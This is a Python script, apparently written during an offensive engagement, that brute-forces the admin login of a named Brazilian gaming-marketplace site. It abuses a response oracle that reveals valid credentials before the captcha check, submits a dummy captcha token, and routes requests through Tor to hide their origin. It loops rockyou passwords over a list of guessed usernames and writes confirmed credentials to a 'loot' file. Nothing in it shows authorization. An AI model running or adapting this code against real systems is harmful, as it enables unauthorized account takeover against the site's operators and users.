#!/usr/bin/env python3
"""
PIVOT RODADA 2 — /admin/autenticacao/login brute via ORACULO (sem 2Captcha).
Oraculo F-021: server valida CRED antes do captcha. Body contem "confere"
= cred ERRADA. Body SEM "confere" = cred CORRETA (so reclama captcha).
Wordlist: rockyou top 1000. Nao-destrutivo.
"""
import sys, time, random, requests, urllib3, re, json
from datetime import datetime
urllib3.disable_warnings()
PROXY={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
URL="https://186.226.60.54/admin/autenticacao/login"
HOSTH="desapegogames.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

USERNAMES=[
    "administrador","adminv","dev1ce","devaashe","masterx","admin","root",
    "diego","diegobtrindade","desapegogames","suporte","master",
]

def load_wordlist(path):
    with open(path,encoding="utf-8",errors="replace") as f:
        return [l.rstrip("\n") for l in f if l.strip()]

def main():
    wlp="/tmp/opencode/pivot/rockyou_top1000.txt"
    passwords=load_wordlist(wlp)
    out="enum/pivot_admin_oracle_rockyou.log"
    f=open(out,"w")
    def log(m):
        ts=datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        line=f"{ts} {m}"
        print(line,flush=True); f.write(line+"\n"); f.flush()
    log(f"[*] PIVOT admin login ORACULO brute — {len(USERNAMES)} users x {len(passwords)} passes = {len(USERNAMES)*len(passwords)} tentativas (rockyou top1000)")
    log(f"[*] Oraculo F-021: body SEM 'confere' = cred CORRETA")
    tried=0; hits=[]
    for user in USERNAMES:
        for pw in passwords:
            tried+=1
            sess=requests.Session(); sess.proxies.update(PROXY)
            try:
                r=sess.post(URL,headers={"Host":HOSTH,"User-Agent":UA},
                            data={"login":user,"senha":pw,"g-recaptcha-response":"DUMMY_BYPASS"},
                            verify=False,timeout=30,allow_redirects=False)
                body=r.content
                confere=b"confere" in body
                if not confere:
                    # ORACULO POSITIVO — cred correta (body nao tem "nao confere")
                    msgs=re.findall(rb'<div[^>]*class="[^"]*text-danger[^"]*"[^>]*>(.*?)</div>',body,re.DOTALL)
                    msgs_txt=[re.sub(rb'<[^>]+>',b'',m).strip().decode('utf-8',errors='replace') for m in msgs]
                    log(f"  [{tried:05d}] *** ORACULO POSITIVO *** {user!r}:{pw!r} -> HTTP {r.status_code} msgs={msgs_txt[:5]}")
                    hits.append((user,pw,r.status_code,msgs_txt))
                else:
                    if tried%100==0:
                        log(f"  [{tried:05d}] {user!r}:{pw!r} -> WRONG (confere=True) HTTP {r.status_code}")
            except Exception as e:
                log(f"  [{tried:05d}] {user!r}:{pw!r} -> EXC {type(e).__name__}: {e}")
                time.sleep(5)
            time.sleep(random.uniform(1.5,2.5))
    log(f"\n=== RESULTADO PIVOT ADMIN ORACLE ROCKYOU ===")
    log(f"Total tentativas: {tried}")
    log(f"Oraculo positivos (sem 'confere'): {len(hits)}")
    for u,p,st,ms in hits:
        log(f"  HIT: {u!r}:{p!r} status={st} msgs={ms}")
    if hits:
        log(f"\n[+] Cred(s) admin confirmada(s) via oraculo — usar 2Captcha para logar.")
        # salvar creds em loot
        with open("loot/admin_creds_rockyou.txt","w") as lf:
            for u,p,st,ms in hits:
                lf.write(f"{u}:{p}\n")
    else:
        log(f"[-] Nenhum oraculo positivo com rockyou top1000.")
    f.close()
    return hits

if __name__=="__main__":
    main()
